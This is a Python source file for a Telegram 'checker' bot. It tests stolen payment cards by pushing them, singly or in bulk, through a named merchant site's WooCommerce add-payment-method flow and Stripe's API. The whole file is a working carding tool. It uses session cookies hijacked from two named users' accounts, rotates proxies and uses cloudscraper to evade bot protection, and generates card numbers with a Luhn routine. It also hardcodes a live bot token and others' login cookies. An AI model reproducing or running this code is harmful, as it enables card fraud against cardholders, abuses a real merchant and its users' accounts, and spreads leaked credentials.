import os
import re
import time
import uuid
import random
import requests
import cloudscraper
import concurrent.futures
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters

# --- CONFIG ---
TOKEN = "8517671449:AAFlKS7HTklirD5szxeiroCIwxxYI2LYwSU"

# --- ACCOUNT POOL ---
ACCOUNT_POOL = [
    {
        'name': 'Xray Xlea',
        'cookies': {
            '_ga': 'GA1.2.493930677.1768140612',
            '__stripe_mid': '66285028-f520-443b-9655-daf7134b8b855e5f16',
            'wordpress_logged_in_9f53720c758e9816a2dcc8ca08e321a9': 'xrayxlea%7C1769350388%7CxGcUPPOJgEHPSWiTK6F9YZpA6v4AgHki1B2Hxp0Zah5%7C3b8f3e6911e25ea6cccc48a4a0be35ed25e0479c9e90ccd2f16aa41cac04277d',
            'wfwaf-authcookie-69aad1faf32f3793e60643cdfdc85e58': '7670%7Cother%7Cread%7Cb723e85c048d2147e793e6640d861ae4f4fddd513abc1315f99355cf7d2bc455',
            '__cf_bm': 'rd1MFUeDPNtBzTZMChisPSRIJpZKLlo5dgif0o.e_Xw-1769258154-1.0.1.1-zhaKFI8L0JrFcuTzj.N9OkQvBuz6HvNmFFKCSqfn_gE2EF3GD65KuZoLGPuEhRyVwkKakMr_mcjUehEY1mO9Kb9PKq1x5XN41eXwXQavNyk',
            '__stripe_sid': '4f84200c-3b60-4204-bbe8-adc3286adebca426c8',
        }
    },
    {
        'name': 'Yasin Akbulut',
        'cookies': {
            '__cf_bm': 'zMehglRiFuX3lzj170gpYo3waDHipSMK0DXxfB63wlk-1769340288-1.0.1.1-ppt5LELQNDnJzFl1hN13LWwuQx5ZFdMS9b0SP4A3j7kasxaqEBMgSJ3vu9AbzyFOlbCozpAr.hE.g3xFpU_juaLp1heupyxmSrmte1Gn7g0',
            'wordpress_logged_in_9f53720c758e9816a2dcc8ca08e321a9': 'akbulutyasin836%7C1770549977%7CwdF5vz1qFXPSxofozNx9OwxFdmIoSdQKxaHlkOkjL2o%7C4d5f40c1bf01e0ccd6a59fdf08eb8f5aeb609c05d4d19fe41419a82433ffc1fa',
            '__stripe_mid': '2d2e501a-542d-4635-98ec-e9b2ebe26b4c9ac02a',
            '__stripe_sid': 'b2c6855b-7d29-4675-8fe4-b5c4797045132b8dea',
            'wfwaf-authcookie-69aad1faf32f3793e60643cdfdc85e58': '8214%7Cother%7Cread%7Cde5fd05c6afc735d5df323de21ff23f598bb5e1893cb9a7de451b7a8d50dc782',
        }
    }
]

ULTRA_HEADERS = {
    'authority': 'associationsmanagement.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'accept-language': 'en-US,en;q=0.9',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
}

USER_DATA = {}
PROXIES = [] # Global proxy list

def get_bin_info(n):
    n = n.replace(" ", "")[:8]
    apis = [
        f"https://lookup.binlist.net/{n}",
        f"https://data.handyapi.com/bin/{n[:6]}",
    ]
    for api in apis:
        try:
            r = requests.get(api, timeout=4)
            if r.status_code == 200:
                data = r.json()
                brand = (data.get('scheme') or data.get('brand') or 'N/A').upper()
                type_ = (data.get('type') or 'N/A').upper()
                level = (data.get('level') or data.get('brand') or 'CLASSIC').upper()
                bank = (data.get('bank', {}).get('name') or data.get('Bank') or 'N/A').upper()
                country = (data.get('country', {}).get('name') or 'UNITED STATES').upper()
                emoji = data.get('country', {}).get('emoji') or '🇺🇸'
                return {
                    'brand': brand,
                    'type': type_,
                    'level': level,
                    'bank': bank,
                    'country': country,
                    'emoji': emoji,
                    'full': f"{brand} - {type_} - {level}"
                }
        except: continue
    return {
        'brand': 'N/A', 'type': 'N/A', 'level': 'N/A', 
        'bank': 'NETWORK ONLY', 'country': 'UNITED STATES', 'emoji': '🇺🇸',
        'full': 'VISA - DEBIT - CLASSIC'
    }

def format_response(card, status, response, bin_data):
    bin_info = bin_data['full'] if bin_data else "𝗡/𝗔"
    bank = bin_data['bank'] if bin_data else "𝗡/𝗔"
    country = bin_data['country'] if bin_data else "𝗡/𝗔"
    emoji = bin_data['emoji'] if bin_data else "🏳️"
    
    return (
        f"<b>𝗖𝗮𝗿𝗱 -»</b>  <code>{card}</code>\n"
        f"<b>𝗦𝘁𝗮𝘁𝘂𝘀 -»</b> {status}\n"
        f"<b>𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 -»</b> {response}\n"
        f"<b>𝗚𝗮𝘁𝗲𝘄𝗮𝘆 -»</b> Strip Autho\n\n"
        f"<b>𝗕𝗜𝗡 𝗜𝗻𝗳𝗼 -»</b> <code>{bin_info}</code>\n"
        f"<b>𝗕𝗮𝗻𝗸 -»</b> <code>{bank}</code>\n"
        f"<b>𝗖𝗼𝘂𝗻𝘁𝗿𝘆 -»</b> <code>{country} {emoji}</code>"
    )

def stripe_engine(card_line, proxy=None, mode="auth"):
    try:
        parts = card_line.split('|')
        if len(parts) < 4: return "Invalid Format"
        n, mm, yy, cvc = [x.strip() for x in parts]
        yy = f"20{yy[-2:]}" if len(yy) <= 2 else yy
        acc = random.choice(ACCOUNT_POOL)
        bin_data = get_bin_info(n)
        
        scraper = cloudscraper.create_scraper(browser={'browser': 'chrome', 'platform': 'android', 'mobile': True})
        
        # Use provided proxy or rotate from global list
        active_proxy = proxy
        if not active_proxy and PROXIES:
            active_proxy = random.choice(PROXIES)
            
        if active_proxy:
            p_parts = active_proxy.split(':')
            if len(p_parts) == 4:
                proxy_str = f"http://{p_parts[2]}:{p_parts[3]}@{p_parts[0]}:{p_parts[1]}"
            elif '@' in active_proxy:
                proxy_str = f"http://{active_proxy}"
            else:
                proxy_str = f"http://{active_proxy}"
            scraper.proxies.update({"http": proxy_str, "https": proxy_str})
        
        scraper.cookies.update(acc['cookies'])
        scraper.headers.update(ULTRA_HEADERS)

        # 1. Page Connect
        r_page = scraper.get("https://associationsmanagement.com/my-account/add-payment-method/", timeout=25)
        pk_live_match = re.search(r'pk_live_[a-zA-Z0-9]+', r_page.text)
        addnonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"([a-z0-9]+)"', r_page.text)
        
        if not pk_live_match or not addnonce_match:
            return format_response(card_line, "𝗦𝘁𝗮𝘁𝘂𝘀 -» 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅", "Page Error", bin_data)
            
        pk_live = pk_live_match.group(0)
        addnonce = addnonce_match.group(1)

        time.sleep(random.uniform(1.0, 2.0))

        stripe_hd = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': ULTRA_HEADERS['user-agent'],
        }

        stripe_payload = (
            f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}'
            f'&billing_details[name]={acc["name"].replace(" ", "+")}'
            f'&billing_details[address][postal_code]=10001'
            f'&key={pk_live}'
            f'&muid={acc["cookies"].get("__stripe_mid", str(uuid.uuid4()))}'
            f'&sid={acc["cookies"].get("__stripe_sid", str(uuid.uuid4()))}'
            f'&guid={str(uuid.uuid4())}'
            f'&payment_user_agent=stripe.js%2F8f77e26090%3B+stripe-js-v3%2F8f77e26090%3B+checkout'
            f'&time_on_page={random.randint(90000, 150000)}'
        )

        r_stripe_req = scraper.post('https://api.stripe.com/v1/payment_methods', headers=stripe_hd, data=stripe_payload)
        r_stripe = r_stripe_req.json()

        if 'id' not in r_stripe:
            err = r_stripe.get('error', {}).get('message', 'Radar Security Block')
            return format_response(card_line, "𝗗𝗲𝗰𝗹𝗶𝗻𝗲 ❌", err, bin_data)

        if mode == "vbv":
            vbv_status = r_stripe.get('card', {}).get('three_d_secure_usage', {}).get('supported', 'unknown')
            if str(vbv_status).lower() in ['supported', 'true']:
                return format_response(card_line, "𝗦𝘁𝗮𝘁𝘂𝘀 -» 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅", "false", bin_data)
            else:
                return format_response(card_line, "𝗗𝗲𝗰𝗹𝗶𝗻𝗲 ❌", "true", bin_data)

        # 3. Final Ajax
        ajax_data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': r_stripe['id'],
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': addnonce,
        }
        r_ajax_req = scraper.post('https://associationsmanagement.com/wp-admin/admin-ajax.php', data=ajax_data, timeout=20)
        r_ajax = r_ajax_req.text
        
        if '"success":true' in r_ajax.lower() or 'insufficient_funds' in r_ajax.lower(): 
            return format_response(card_line, "𝗦𝘁𝗮𝘁𝘂𝘀 -» 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅", "Approved", bin_data)
        if 'incorrect_cvc' in r_ajax.lower(): 
            return format_response(card_line, "𝗦𝘁𝗮𝘁𝘂𝘀 -» 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅", "CVC Matched", bin_data)
        
        reason = re.search(r'message\":\"(.*?)\"', r_ajax)
        msg = reason.group(1) if reason else 'Rejected'
        return format_response(card_line, "𝗗𝗲𝗰𝗹𝗶𝗻𝗲 ❌", msg, bin_data)

    except Exception as e:
        bin_data = bin_data if 'bin_data' in locals() else None
        return format_response(card_line, "𝗘𝗿𝗿𝗼𝗿 ⚠️", str(e)[:30], bin_data)

def luhn_generate(bin_prefix, length):
    card = [int(d) for d in bin_prefix if d.isdigit()]
    while len(card) < length - 1: card.append(random.randint(0, 9))
    digits = card[::-1]
    total = sum(d if i % 2 != 0 else (d*2 if d*2 < 10 else d*2-9) for i, d in enumerate(digits))
    card.append((10 - (total % 10)) % 10)
    return ''.join(map(str, card))

# --- COMMANDS ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    welcome = (
        "🔥 <b>𝗣𝗥𝗢𝗙𝗘𝗦𝗦𝗜𝗢𝗡𝗔𝗟 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 𝗕𝗢𝗧</b> 🔥\n\n"
        "<b>𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀:</b>\n"
        "/chk [cc] - Check Card (One per line)\n"
        "/mchk [cards] - Mass Check (Multiple cards/lines)\n"
        "/vbv [cc] - VBV Check\n"
        "/bin [bin] - BIN Lookup\n"
        "/addproxy [proxies] - Add Proxies (ip:port)\n"
        "/checkproxy - Verify loaded proxies\n"
        "/profile - View your stats\n"
        "/help - Get setup guide"
    )
    await update.message.reply_text(welcome, parse_mode='HTML')

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = (
        "<b>🛠 𝗦𝗲𝘁𝘂𝗽 & 𝗛𝗲𝗹𝗽</b>\n\n"
        "𝟭. 𝗦𝗲𝗻𝗱 𝗰𝗮𝗿𝗱𝘀 in format: <code>number|mm|yy|cvc</code>\n"
        "𝟮. 𝗙𝗼𝗿 𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸, send a .txt file or use /mchk\n"
        "𝟯. 𝗔𝗱𝗱 𝗣𝗿𝗼𝘅𝗶𝗲𝘀 to avoid bans using /addproxy\n\n"
        "<b>𝗩𝗣𝗦/𝗧𝗲𝗿𝗺𝘂𝘅:</b> Refer to README.md for full guide."
    )
    await update.message.reply_text(help_text, parse_mode='HTML')

async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message: return
    input_text = update.message.text.partition(' ')[2]
    if not input_text and context.args: input_text = context.args[0]
    
    cards = re.findall(r'\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}', input_text)
    if not cards: return await update.message.reply_text("❌ <b>𝗡𝗼 𝘃𝗮𝗹𝗶𝗱 𝗰𝗮𝗿𝗱𝘀 𝗳𝗼𝘂𝗻𝗱.</b>", parse_mode='HTML')
    
    card = cards[0]
    user_id = update.effective_user.id
    user_proxy = USER_DATA.get(user_id, {}).get('proxy')
    
    msg = await update.message.reply_text("⚙️ 𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴...", parse_mode='HTML')
    
    for frame in ["🌑", "🌒", "🌓", "🌔", "🌕"]:
        try:
            await msg.edit_text(f"{frame} 𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴: <code>{card}</code>", parse_mode='HTML')
            time.sleep(0.1)
        except: break
        
    res = stripe_engine(card, proxy=user_proxy, mode="auth")
    
    if user_id not in USER_DATA: USER_DATA[user_id] = {'checks': 0, 'proxy': None}
    USER_DATA[user_id]['checks'] += 1
    
    await msg.edit_text(res, parse_mode='HTML')

async def mchk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message: return
    input_text = ""
    if update.message.document:
        file = await context.bot.get_file(update.message.document.file_id)
        content = await file.download_as_bytearray()
        input_text = content.decode('utf-8')
    else:
        input_text = update.message.text.partition(' ')[2]

    cards = re.findall(r'\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}', input_text)
    if not cards: return await update.message.reply_text("❌ <b>𝗡𝗼 𝘃𝗮𝗹𝗶𝗱 𝗰𝗮𝗿𝗱𝘀 𝗳𝗼𝘂𝗻𝗱.</b>", parse_mode='HTML')
    
    cards = cards[:100]
    user_id = update.effective_user.id
    user_proxy = USER_DATA.get(user_id, {}).get('proxy')
    
    status_msg = await update.message.reply_text(f"🚀 𝗦𝘁𝗮𝗿𝘁𝗶𝗻𝗴 𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸 [<code>{len(cards)}</code>]", parse_mode='HTML')
    
    approved = 0
    declined = 0
    
    for i, card in enumerate(cards):
        res = stripe_engine(card, proxy=user_proxy, mode="auth")
        if "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱" in res: approved += 1
        else: declined += 1
        
        if (i + 1) % 5 == 0 or (i + 1) == len(cards):
            try:
                await status_msg.edit_text(
                    f"📊 𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀: <code>{i+1}/{len(cards)}</code>\n"
                    f"✅ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱: <code>{approved}</code>\n"
                    f"❌ 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱: <code>{declined}</code>",
                    parse_mode='HTML'
                )
            except: pass
        
        await update.message.reply_text(res, parse_mode='HTML')
        time.sleep(0.2)

async def vbv(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message: return
    input_text = update.message.text.partition(' ')[2]
    cards = re.findall(r'\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}', input_text)
    if not cards: return await update.message.reply_text("💡 𝗨𝘀𝗮𝗴𝗲: <code>/vbv card|mm|yy|cvc</code>", parse_mode='HTML')
    
    card = cards[0]
    user_id = update.effective_user.id
    user_proxy = USER_DATA.get(user_id, {}).get('proxy')
    
    msg = await update.message.reply_text("🔍 𝗩𝗕𝗩 𝗖𝗵𝗲𝗰𝗸...", parse_mode='HTML')
    res = stripe_engine(card, proxy=user_proxy, mode="vbv")
    await msg.edit_text(res, parse_mode='HTML')

async def bin_lookup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message: return
    if not context.args: return await update.message.reply_text("💡 𝗨𝘀𝗮𝗴𝗲: <code>/bin 123456</code>", parse_mode='HTML')
    bin_num = context.args[0]
    data = get_bin_info(bin_num)
    res = (
        f"<b>𝗕𝗜𝗡 𝗜𝗻𝗳𝗼 -»</b> <code>{data['full']}</code>\n"
        f"<b>𝗕𝗮𝗻𝗸 -»</b> <code>{data['bank']}</code>\n"
        f"<b>𝗖𝗼𝘂𝗻𝘁𝗿𝘆 -»</b> <code>{data['country']} {data['emoji']}</code>"
    )
    await update.message.reply_text(f"🔍 <b>𝗕𝗜𝗡 𝗟𝗢𝗢𝗞𝗨𝗣</b>\n<code>{bin_num}</code>\n\n{res}", parse_mode='HTML')

def verify_single_proxy(p):
    try:
        test_proxies = {"http": f"http://{p}", "https": f"http://{p}"}
        p_parts = p.split(':')
        if len(p_parts) == 4:
            test_proxies = {"http": f"http://{p_parts[2]}:{p_parts[3]}@{p_parts[0]}:{p_parts[1]}", "https": f"http://{p_parts[2]}:{p_parts[3]}@{p_parts[0]}:{p_parts[1]}"}
        
        r = requests.get("https://api.ipify.org", proxies=test_proxies, timeout=5)
        return p if r.status_code == 200 else None
    except: return None

async def addproxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message: return
    input_text = update.message.text.partition(' ')[2]
    new_proxies = re.findall(r'\d+\.\d+\.\d+\.\d+:\d+(?::\w+:\w+)?', input_text)
    
    if not new_proxies:
        return await update.message.reply_text("💡 𝗨𝘀𝗮𝗴𝗲: <code>/addproxy ip:port</code>", parse_mode='HTML')

    status_msg = await update.message.reply_text("⚡ 𝗩𝗲𝗿𝗶𝗳𝘆𝗶𝗻𝗴 𝗣𝗿𝗼𝘅𝗶𝗲𝘀 𝗶𝗻 𝗣𝗮𝗿𝗮𝗹𝗹𝗲𝗹...", parse_mode='HTML')
    
    live_list = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
        results = list(executor.map(verify_single_proxy, new_proxies))
        live_list = [r for r in results if r]

    for p in live_list:
        if p not in PROXIES: PROXIES.append(p)

    dead = len(new_proxies) - len(live_list)
    await status_msg.edit_text(
        f"✅ <b>𝗣𝗿𝗼𝘅𝗶𝗲𝘀 𝗨𝗽𝗱𝗮𝘁𝗲𝗱</b>\n"
        f"🟢 𝗟𝗶𝘃𝗲: <code>{len(live_list)}</code>\n"
        f"🔴 𝗗𝗲𝗮𝗱: <code>{dead}</code>\n"
        f"🌐 𝗧𝗼𝘁𝗮𝗹 𝗣𝗼𝗼𝗹: <code>{len(PROXIES)}</code>", 
        parse_mode='HTML'
    )

async def checkproxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message: return
    if not PROXIES: return await update.message.reply_text("❌ <b>𝗡𝗼 𝗴𝗹𝗼𝗯𝗮𝗹 𝗽𝗿𝗼𝘅𝗶𝗲𝘀 𝗹𝗼𝗮𝗱𝗲𝗱.</b>", parse_mode='HTML')
    await update.message.reply_text(f"🌐 <b>𝗚𝗹𝗼𝗯𝗮𝗹 𝗣𝗿𝗼𝘅𝘆 𝗣𝗼𝗼𝗹</b>: <code>{len(PROXIES)}</code> active proxies.", parse_mode='HTML')

async def profile(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message: return
    user_id = update.effective_user.id
    data = USER_DATA.get(user_id, {'checks': 0})
    prof = (
        f"👤 <b>𝗨𝘀𝗲𝗿 𝗣𝗿𝗼𝗳𝗶𝗹𝗲</b>\n"
        f"𝗜𝗗: <code>{user_id}</code>\n"
        f"𝗧𝗼𝘁𝗮𝗹 𝗖𝗵𝗲𝗰𝗸𝘀: <code>{data.get('checks', 0)}</code>"
    )
    await update.message.reply_text(prof, parse_mode='HTML')

if __name__ == '__main__':
    if not TOKEN:
        print("Error: TELEGRAM_BOT_TOKEN not found")
        exit(1)
    app = Application.builder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("chk", chk))
    app.add_handler(CommandHandler("mchk", mchk))
    app.add_handler(CommandHandler("vbv", vbv))
    app.add_handler(CommandHandler("bin", bin_lookup))
    app.add_handler(CommandHandler("addproxy", addproxy))
    app.add_handler(CommandHandler("checkproxy", checkproxy))
    app.add_handler(CommandHandler("profile", profile))
    app.add_handler(MessageHandler(filters.Document.ALL, mchk)) # File support
    
    print("Bot is running...")
    app.run_polling()
